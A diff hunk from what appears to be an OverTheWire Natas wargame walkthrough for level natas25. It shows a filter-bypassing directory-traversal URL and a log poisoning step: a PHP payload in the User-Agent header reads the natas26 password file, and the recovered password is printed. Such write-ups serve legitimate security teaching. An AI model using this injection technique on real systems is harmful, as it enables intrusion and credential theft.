@@ -1744,7 +1744,7 @@ Try access http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_ea
 [06.03.2022 20::19:41] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::19:46] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::20:48] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::21:21] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::22:29] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." 
 ```
 
-Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass/natas26");?>`, the password of natas26 will be written to the file. See log and get password `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`.
+Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass/natas26");?>`, the password of natas26 will be written to the log file. See log and get password `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`.
 
 ### natas26
 
